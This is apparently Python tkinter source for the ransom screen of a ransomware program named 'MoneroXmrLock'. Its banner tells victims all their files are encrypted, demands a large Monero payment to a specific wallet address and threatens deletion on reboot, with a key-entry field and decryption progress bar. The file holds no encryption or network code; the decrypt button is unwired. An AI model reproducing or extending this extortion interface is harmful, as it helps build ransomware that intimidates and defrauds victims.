import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import os

def resource_path(relative_path):
    return os.path.join(os.path.abspath("."), relative_path)

ICON_PATH = resource_path("img/app_icon.png")
EXPANDED_PATH = resource_path("img/app.icon.png")

class CryptoLockGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("MoneroXmrLock")
        self.configure(bg='black')
        self.geometry("900x800")
        self.setup_ui()
        self.setup_key_frame()
        self.setup_log_frame()
        self.setup_progress_frame()

    def setup_ui(self):
        top_frame = tk.Frame(self, bg='black')
        top_frame.pack(pady=(30, 10))

        # Enlarged App Icon
        try:
            icon_img = Image.open(ICON_PATH).resize((200, 200))
            icon_tk = ImageTk.PhotoImage(icon_img)
            icon_label = tk.Label(top_frame, image=icon_tk, bg='black')
            icon_label.image = icon_tk
            icon_label.pack(side=tk.LEFT, padx=20)
        except:
            pass

        # Expanded Logo
        try:
            expanded_img = Image.open(EXPANDED_PATH).resize((300, 300))
            expanded_tk = ImageTk.PhotoImage(expanded_img)
            expanded_label = tk.Label(top_frame, image=expanded_tk, bg='black')
            expanded_label.image = expanded_tk
            expanded_label.pack(side=tk.LEFT, padx=20)
        except:
            pass

        # Hacker Mode Banner
        banner_text = (
            "Welcome to AGENT007 portal - ALL YOUR FILES HAVE BEEN ENCRYPTED.\n"
            "TO RECOVER THEM YOU MUST PAY 3696.61655621 MONERO (XMR) TO THIS ADDRESS:\n"
            "41x6u9ERwrAjboXxBwFbfrhdAJn2XzCc9ESquhu1fs4cbd2FGHocom4QEjJTFq6iVzXPGKDJP8o5KLmw3xz6XuVZ6xdbEaH\n\n"
            "IF YOU ATTEMPT TO REBOOT OR SHUTDOWN YOUR FILES WILL BE DELETED."
        )

        banner = tk.Label(self, text=banner_text,
                          font=('Courier New', 12), fg='green', bg='black', justify=tk.CENTER)
        banner.pack(pady=(30, 10))

    # Step 6: Decryption Key Input Frame
    def setup_key_frame(self):
        key_frame = tk.Frame(self, bg='black')
        key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
        self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10, 0), ipady=8)
        tk.Button(key_frame, text="START DECRYPTION", bg="#5dd94f", fg='white', font=('Helvetica', 12),
                  relief=tk.FLAT).pack(side=tk.RIGHT, padx=(10, 0))

    # Step 7: Logging Frame with Banner
    def setup_log_frame(self):
        log_frame = tk.Frame(self, bg='black')
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        banner_text = "Welcome to MoneroXmrLocker"
        banner_label = tk.Label(log_frame, text=banner_text, fg='green', bg='black', font=('Courier New', 12))
        banner_label.pack(side=tk.TOP, fill=tk.X)

        self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
        self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.log_listbox.config(yscrollcommand=scrollbar.set)

    # Step 8: Decryption Progress Frame
    def setup_progress_frame(self):
        self.progress_frame = tk.Frame(self, bg='black')
        self.progress_frame.pack(fill=tk.X, padx=10, pady=20)

        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)

        self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar",
                                        orient=tk.HORIZONTAL, length=400, mode='determinate')
        self.progress.pack(fill=tk.X, expand=True)

        self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='green')
        self.progress_label.pack()

if __name__ == "__main__":
    app = CryptoLockGUI()
    app.mainloop()
